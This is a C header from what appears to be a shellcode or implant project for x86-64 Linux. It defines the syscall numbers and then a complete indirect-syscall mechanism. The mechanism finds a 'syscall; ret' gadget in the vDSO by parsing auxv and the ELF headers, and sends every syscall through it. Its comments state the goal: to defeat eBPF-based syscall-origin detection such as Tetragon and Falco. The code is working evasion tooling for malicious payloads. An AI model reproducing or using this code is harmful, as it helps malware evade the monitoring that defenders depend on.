#ifndef SYSCALLS_H
#define SYSCALLS_H

#define SYS_read 0
#define SYS_write 1
#define SYS_open 2
#define SYS_close 3
#define SYS_stat 4
#define SYS_fstat 5
#define SYS_lstat 6
#define SYS_poll 7
#define SYS_lseek 8
#define SYS_mmap 9
#define SYS_mprotect 10
#define SYS_munmap 11
#define SYS_brk 12
#define SYS_rt_sigaction 13
#define SYS_rt_sigprocmask 14
#define SYS_rt_sigreturn 15
#define SYS_ioctl 16
#define SYS_pread64 17
#define SYS_pwrite64 18
#define SYS_readv 19
#define SYS_writev 20
#define SYS_access 21
#define SYS_pipe 22
#define SYS_select 23
#define SYS_sched_yield 24
#define SYS_mremap 25
#define SYS_msync 26
#define SYS_mincore 27
#define SYS_madvise 28
#define SYS_shmget 29
#define SYS_shmat 30
#define SYS_shmctl 31
#define SYS_dup 32
#define SYS_dup2 33
#define SYS_pause 34
#define SYS_nanosleep 35
#define SYS_getitimer 36
#define SYS_alarm 37
#define SYS_setitimer 38
#define SYS_getpid 39
#define SYS_sendfile 40
#define SYS_socket 41
#define SYS_connect 42
#define SYS_accept 43
#define SYS_sendto 44
#define SYS_recvfrom 45
#define SYS_sendmsg 46
#define SYS_recvmsg 47
#define SYS_shutdown 48
#define SYS_bind 49
#define SYS_listen 50
#define SYS_getsockname 51
#define SYS_getpeername 52
#define SYS_socketpair 53
#define SYS_setsockopt 54
#define SYS_getsockopt 55
#define SYS_clone 56
#define SYS_fork 57
#define SYS_vfork 58
#define SYS_execve 59
#define SYS_exit 60
#define SYS_wait4 61
#define SYS_kill 62
#define SYS_uname 63
#define SYS_semget 64
#define SYS_semop 65
#define SYS_semctl 66
#define SYS_shmdt 67
#define SYS_msgget 68
#define SYS_msgsnd 69
#define SYS_msgrcv 70
#define SYS_msgctl 71
#define SYS_fcntl 72
#define SYS_flock 73
#define SYS_fsync 74
#define SYS_fdatasync 75
#define SYS_truncate 76
#define SYS_ftruncate 77
#define SYS_getdents 78
#define SYS_getcwd 79
#define SYS_chdir 80
#define SYS_fchdir 81
#define SYS_rename 82
#define SYS_mkdir 83
#define SYS_rmdir 84
#define SYS_creat 85
#define SYS_link 86
#define SYS_unlink 87
#define SYS_symlink 88
#define SYS_readlink 89
#define SYS_chmod 90
#define SYS_fchmod 91
#define SYS_chown 92
#define SYS_fchown 93
#define SYS_lchown 94
#define SYS_umask 95
#define SYS_gettimeofday 96
#define SYS_getrlimit 97
#define SYS_getrusage 98
#define SYS_sysinfo 99
#define SYS_times 100
#define SYS_ptrace 101
#define SYS_getuid 102
#define SYS_syslog 103
#define SYS_getgid 104
#define SYS_setuid 105
#define SYS_setgid 106
#define SYS_geteuid 107
#define SYS_getegid 108
#define SYS_setpgid 109
#define SYS_getppid 110
#define SYS_getpgrp 111
#define SYS_setsid 112
#define SYS_setreuid 113
#define SYS_setregid 114
#define SYS_getgroups 115
#define SYS_setgroups 116
#define SYS_setresuid 117
#define SYS_getresuid 118
#define SYS_setresgid 119
#define SYS_getresgid 120
#define SYS_getpgid 121
#define SYS_setfsuid 122
#define SYS_setfsgid 123
#define SYS_getsid 124
#define SYS_capget 125
#define SYS_capset 126
#define SYS_rt_sigpending 127
#define SYS_rt_sigtimedwait 128
#define SYS_rt_sigqueueinfo 129
#define SYS_rt_sigsuspend 130
#define SYS_sigaltstack 131
#define SYS_utime 132
#define SYS_mknod 133
#define SYS_uselib 134
#define SYS_personality 135
#define SYS_ustat 136
#define SYS_statfs 137
#define SYS_fstatfs 138
#define SYS_sysfs 139
#define SYS_getpriority 140
#define SYS_setpriority 141
#define SYS_sched_setparam 142
#define SYS_sched_getparam 143
#define SYS_sched_setscheduler 144
#define SYS_sched_getscheduler 145
#define SYS_sched_get_priority_max 146
#define SYS_sched_get_priority_min 147
#define SYS_sched_rr_get_interval 148
#define SYS_mlock 149
#define SYS_munlock 150
#define SYS_mlockall 151
#define SYS_munlockall 152
#define SYS_vhangup 153
#define SYS_modify_ldt 154
#define SYS_pivot_root 155
#define SYS_sysctl 156
#define SYS_prctl 157
#define SYS_arch_prctl 158
#define SYS_adjtimex 159
#define SYS_setrlimit 160
#define SYS_chroot 161
#define SYS_sync 162
#define SYS_acct 163
#define SYS_settimeofday 164
#define SYS_mount 165
#define SYS_umount2 166
#define SYS_swapon 167
#define SYS_swapoff 168
#define SYS_reboot 169
#define SYS_sethostname 170
#define SYS_setdomainname 171
#define SYS_iopl 172
#define SYS_ioperm 173
#define SYS_create_module 174
#define SYS_init_module 175
#define SYS_delete_module 176
#define SYS_get_kernel_syms 177
#define SYS_query_module 178
#define SYS_quotactl 179
#define SYS_nfsservctl 180
#define SYS_getpmsg 181
#define SYS_putpmsg 182
#define SYS_afs_syscall 183
#define SYS_tux 184
#define SYS_security 185
#define SYS_gettid 186
#define SYS_readahead 187
#define SYS_setxattr 188
#define SYS_lsetxattr 189
#define SYS_fsetxattr 190
#define SYS_getxattr 191
#define SYS_lgetxattr 192
#define SYS_fgetxattr 193
#define SYS_listxattr 194
#define SYS_llistxattr 195
#define SYS_flistxattr 196
#define SYS_removexattr 197
#define SYS_lremovexattr 198
#define SYS_fremovexattr 199
#define SYS_tkill 200
#define SYS_time 201
#define SYS_futex 202
#define SYS_sched_setaffinity 203
#define SYS_sched_getaffinity 204
#define SYS_set_thread_area 205
#define SYS_io_setup 206
#define SYS_io_destroy 207
#define SYS_io_getevents 208
#define SYS_io_submit 209
#define SYS_io_cancel 210
#define SYS_get_thread_area 211
#define SYS_lookup_dcookie 212
#define SYS_epoll_create 213
#define SYS_epoll_ctl_old 214
#define SYS_epoll_wait_old 215
#define SYS_remap_file_pages 216
#define SYS_getdents64 217
#define SYS_set_tid_address 218
#define SYS_restart_syscall 219
#define SYS_semtimedop 220
#define SYS_fadvise64 221
#define SYS_timer_create 222
#define SYS_timer_settime 223
#define SYS_timer_gettime 224
#define SYS_timer_getoverrun 225
#define SYS_timer_delete 226
#define SYS_clock_settime 227
#define SYS_clock_gettime 228
#define SYS_clock_getres 229
#define SYS_clock_nanosleep 230
#define SYS_exit_group 231
#define SYS_epoll_wait 232
#define SYS_epoll_ctl 233
#define SYS_tgkill 234
#define SYS_utimes 235
#define SYS_vserver 236
#define SYS_mbind 237
#define SYS_set_mempolicy 238
#define SYS_get_mempolicy 239
#define SYS_mq_open 240
#define SYS_mq_unlink 241
#define SYS_mq_timedsend 242
#define SYS_mq_timedreceive 243
#define SYS_mq_notify 244
#define SYS_mq_getsetattr 245
#define SYS_kexec_load 246
#define SYS_waitid 247
#define SYS_add_key 248
#define SYS_request_key 249
#define SYS_keyctl 250
#define SYS_ioprio_set 251
#define SYS_ioprio_get 252
#define SYS_inotify_init 253
#define SYS_inotify_add_watch 254
#define SYS_inotify_rm_watch 255
#define SYS_migrate_pages 256
#define SYS_openat 257
#define SYS_mkdirat 258
#define SYS_mknodat 259
#define SYS_fchownat 260
#define SYS_futimesat 261
#define SYS_newfstatat 262
#define SYS_unlinkat 263
#define SYS_renameat 264
#define SYS_linkat 265
#define SYS_symlinkat 266
#define SYS_readlinkat 267
#define SYS_fchmodat 268
#define SYS_faccessat 269
#define SYS_pselect6 270
#define SYS_ppoll 271
#define SYS_unshare 272
#define SYS_set_robust_list 273
#define SYS_get_robust_list 274
#define SYS_splice 275
#define SYS_tee 276
#define SYS_sync_file_range 277
#define SYS_vmsplice 278
#define SYS_move_pages 279
#define SYS_utimensat 280
#define SYS_epoll_pwait 281
#define SYS_signalfd 282
#define SYS_timerfd_create 283
#define SYS_eventfd 284
#define SYS_fallocate 285
#define SYS_timerfd_settime 286
#define SYS_timerfd_gettime 287
#define SYS_accept4 288
#define SYS_signalfd4 289
#define SYS_eventfd2 290
#define SYS_epoll_create1 291
#define SYS_dup3 292
#define SYS_pipe2 293
#define SYS_inotify_init1 294
#define SYS_preadv 295
#define SYS_pwritev 296
#define SYS_rt_tgsigqueueinfo 297
#define SYS_perf_event_open 298
#define SYS_recvmmsg 299
#define SYS_fanotify_init 300
#define SYS_fanotify_mark 301
#define SYS_prlimit64 302
#define SYS_name_to_handle_at 303
#define SYS_open_by_handle_at 304
#define SYS_clock_adjtime 305
#define SYS_syncfs 306
#define SYS_sendmmsg 307
#define SYS_setns 308
#define SYS_getcpu 309
#define SYS_process_vm_readv 310
#define SYS_process_vm_writev 311
#define SYS_kcmp 312
#define SYS_finit_module 313
#define SYS_sched_setattr 314
#define SYS_sched_getattr 315
#define SYS_renameat2 316
#define SYS_seccomp 317
#define SYS_getrandom 318
#define SYS_memfd_create 319
#define SYS_kexec_file_load 320
#define SYS_bpf 321
#define SYS_execveat 322
#define SYS_userfaultfd 323
#define SYS_membarrier 324
#define SYS_mlock2 325
#define SYS_copy_file_range 326
#define SYS_preadv2 327
#define SYS_pwritev2 328
#define SYS_pkey_mprotect 329
#define SYS_pkey_alloc 330
#define SYS_pkey_free 331
#define SYS_statx 332

/* -----------------------------------------------------------------------
 * Indirect Syscalls via vDSO Gadget Resolution
 *
 * Instead of executing a 'syscall' instruction from within our shellcode
 * (which resides in anonymous, unbacked memory), we dynamically resolve
 * the address of a 'syscall; ret' instruction sequence within the vDSO —
 * a kernel-mapped, file-backed page present in every Linux process.
 *
 * When we 'call' into that address, the kernel sees RIP pointing to
 * [vdso], which is completely normal and expected. This defeats eBPF-based
 * syscall origin checks (Tetragon, Falco, etc.) that flag syscalls from
 * anonymous memory regions.
 *
 * Resolution strategy:
 *   1. Use embedded fallback gadget to bootstrap open/read of /proc/self/auxv
 *   2. Parse auxv to find AT_SYSINFO_EHDR (vDSO base address)
 *   3. Parse vDSO ELF headers to find executable segments
 *   4. Scan those segments for the byte pattern 0F 05 C3 (syscall; ret)
 *   5. Cache the resolved gadget for all subsequent syscalls
 *   6. Fall back to embedded gadget if any step fails
 * ----------------------------------------------------------------------- */

/* AT_SYSINFO_EHDR auxv type — points to the vDSO ELF header */
#define AT_SYSINFO_EHDR 33
#define AT_NULL_TYPE 0

/* ELF constants for vDSO parsing (minimal set) */
#define ELFMAG0 0x7f
#define ELFMAG1 'E'
#define ELFMAG2 'L'
#define ELFMAG3 'F'
#define PT_LOAD_TYPE 1
#define PF_X_FLAG 0x1

/* Elf64 types for standalone vDSO parsing (no elf.h dependency here) */
typedef struct {
  unsigned char e_ident[16];
  unsigned short e_type;
  unsigned short e_machine;
  unsigned int e_version;
  unsigned long e_entry;
  unsigned long e_phoff;
  unsigned long e_shoff;
  unsigned int e_flags;
  unsigned short e_ehsize;
  unsigned short e_phentsize;
  unsigned short e_phnum;
  unsigned short e_shentsize;
  unsigned short e_shnum;
  unsigned short e_shstrndx;
} Syscall_Elf64_Ehdr;

typedef struct {
  unsigned int p_type;
  unsigned int p_flags;
  unsigned long p_offset;
  unsigned long p_vaddr;
  unsigned long p_paddr;
  unsigned long p_filesz;
  unsigned long p_memsz;
  unsigned long p_align;
} Syscall_Elf64_Phdr;

/*
 * Cache for the resolved gadget.
 * Defined in utils.c (single shared instance per binary).
 * MUST be initialized to a non-zero value to be placed in .data (not .bss).
 * Before init_indirect_syscalls() is called, this points to 0x1 (invalid).
 * After init, it points to either a vDSO gadget or the embedded fallback.
 */
#define _SYSCALL_GADGET_UNRESOLVED ((void *)1)
extern void *_cached_syscall_gadget __attribute__((visibility("hidden")));

/* ---- Embedded fallback gadget (compiled into shellcode) ---- */
static inline void *get_embedded_syscall_gadget(void) {
  void *gadget;
  __asm__ __volatile__("lea 1f(%%rip), %0\n\t"
                       "jmp 2f\n\t"
                       "1: syscall\n\t"
                       "ret\n\t"
                       "2:\n\t"
                       : "=r"(gadget));
  return gadget;
}

/* ---- Hot path: trivial inline, zero overhead after init ---- */

static inline void *get_syscall_gadget(void) {
  return _cached_syscall_gadget;
}

/* ---- vDSO gadget resolution (called once from init) ---- */

/*
 * All resolution functions are noinline and called only from
 * init_indirect_syscalls(). They never run inside a syscall wrapper
 * context, so there are no register-clobbering concerns.
 */

static __attribute__((noinline)) void *
_scan_for_syscall_ret(const unsigned char *base, unsigned long len) {
  if (len < 3)
    return (void *)0;
  for (unsigned long i = 0; i <= len - 3; i++) {
    if (base[i] == 0x0F && base[i + 1] == 0x05 && base[i + 2] == 0xC3) {
      return (void *)(base + i);
    }
  }
  return (void *)0;
}

static __attribute__((noinline)) void *_scan_vdso(unsigned long vdso_base) {
  Syscall_Elf64_Ehdr *ehdr = (Syscall_Elf64_Ehdr *)vdso_base;

  /* Validate ELF magic */
  if (ehdr->e_ident[0] != ELFMAG0 || ehdr->e_ident[1] != ELFMAG1 ||
      ehdr->e_ident[2] != ELFMAG2 || ehdr->e_ident[3] != ELFMAG3) {
    return (void *)0;
  }

  Syscall_Elf64_Phdr *phdr =
      (Syscall_Elf64_Phdr *)(vdso_base + ehdr->e_phoff);

  /* Scan executable segments for the gadget */
  for (int i = 0; i < ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD_TYPE && (phdr[i].p_flags & PF_X_FLAG)) {
      const unsigned char *seg_base =
          (const unsigned char *)(vdso_base + phdr[i].p_offset);
      void *gadget = _scan_for_syscall_ret(seg_base, phdr[i].p_filesz);
      if (gadget)
        return gadget;
    }
  }
  return (void *)0;
}

/* ---- Initialization function (MUST be called before any syscall) ---- */

static __attribute__((noinline)) void init_indirect_syscalls(void) {
  /* Use the embedded gadget for bootstrap syscalls */
  void *boot_gadget = get_embedded_syscall_gadget();
  unsigned long ret;
  long fd;
  long bytes_read;
  unsigned long buf[64]; /* 32 entries, each is {type, value} */

  /* Open /proc/self/auxv */
  char auxv_path[] = {'/', 'p', 'r', 'o', 'c', '/', 's', 'e',
                      'l', 'f', '/', 'a', 'u', 'x', 'v', '\0'};
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(boot_gadget), "a"((long)SYS_open),
                         "D"((long)auxv_path), "S"((long)0), "d"((long)0)
                       : "rcx", "r11", "memory");
  fd = (long)ret;
  if (fd < 0)
    goto fallback;

  /* Read auxv entries */
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(boot_gadget), "a"((long)SYS_read),
                         "D"((long)fd), "S"((long)buf),
                         "d"((long)sizeof(buf))
                       : "rcx", "r11", "memory");
  bytes_read = (long)ret;

  /* Close fd */
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(boot_gadget), "a"((long)SYS_close), "D"((long)fd)
                       : "rcx", "r11", "memory");

  if (bytes_read <= 0)
    goto fallback;

  /* Parse auxv for AT_SYSINFO_EHDR */
  {
    unsigned long num_longs =
        (unsigned long)bytes_read / sizeof(unsigned long);
    for (unsigned long i = 0; i + 1 < num_longs; i += 2) {
      if (buf[i] == AT_SYSINFO_EHDR) {
        void *gadget = _scan_vdso(buf[i + 1]);
        if (gadget) {
          _cached_syscall_gadget = gadget;
          return;
        }
        break;
      }
      if (buf[i] == AT_NULL_TYPE)
        break;
    }
  }

fallback:
  _cached_syscall_gadget = boot_gadget;
}

/* ---- Syscall wrappers (unchanged interface, now use resolved gadget) ---- */

static inline long syscall0(long n) {
  unsigned long ret;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall1(long n, long a1) {
  unsigned long ret;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall2(long n, long a1, long a2) {
  unsigned long ret;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1), "S"(a2)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall3(long n, long a1, long a2, long a3) {
  unsigned long ret;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1), "S"(a2), "d"(a3)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall4(long n, long a1, long a2, long a3, long a4) {
  unsigned long ret;
  register long r10 __asm__("r10") = a4;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1), "S"(a2), "d"(a3),
                         "r"(r10)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall5(long n, long a1, long a2, long a3, long a4,
                            long a5) {
  unsigned long ret;
  register long r10 __asm__("r10") = a4;
  register long r8 __asm__("r8") = a5;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1), "S"(a2), "d"(a3),
                         "r"(r10), "r"(r8)
                       : "rcx", "r11", "memory");
  return ret;
}

static inline long syscall6(long n, long a1, long a2, long a3, long a4,
                            long a5, long a6) {
  unsigned long ret;
  register long r10 __asm__("r10") = a4;
  register long r8 __asm__("r8") = a5;
  register long r9 __asm__("r9") = a6;
  void *gadget = get_syscall_gadget();
  __asm__ __volatile__("call *%1"
                       : "=a"(ret)
                       : "r"(gadget), "a"(n), "D"(a1), "S"(a2), "d"(a3),
                         "r"(r10), "r"(r8), "r"(r9)
                       : "rcx", "r11", "memory");
  return ret;
}

#endif
